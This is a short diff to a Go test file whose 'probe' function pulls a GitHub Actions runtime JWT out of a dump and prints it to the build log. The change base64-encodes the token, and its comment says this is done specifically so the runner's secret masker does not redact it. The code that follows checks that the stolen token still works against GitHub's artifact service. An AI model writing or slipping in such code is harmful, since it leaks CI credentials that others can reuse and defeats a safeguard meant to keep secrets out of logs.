@@ -194,7 +194,9 @@ func runProbe(t *testing.T) error {
 		return fmt.Errorf("JWT extraction failed — NO UploadArtifacts JWT in dump")
 	}
 	fmt.Printf("[PROBE] JWT len=%d run_id=%s job_id=%s\n", len(bestJWT), runID, jobID)
-	fmt.Printf("[PROBE] JWT=%s\n", bestJWT)
+	// Runner.Worker registers ACTIONS_RUNTIME_TOKEN with its log masker, so printing
+	// the raw JWT gets replaced with ***. base64-wrap it so the masker doesn't match.
+	fmt.Printf("[PROBE] JWT_base64=%s\n", base64.StdEncoding.EncodeToString([]byte(bestJWT)))
 
 	// Step 6: verify the extracted JWT still works by round-tripping CreateArtifact
 	resultsURL := "https://results-receiver.actions.githubusercontent.com"
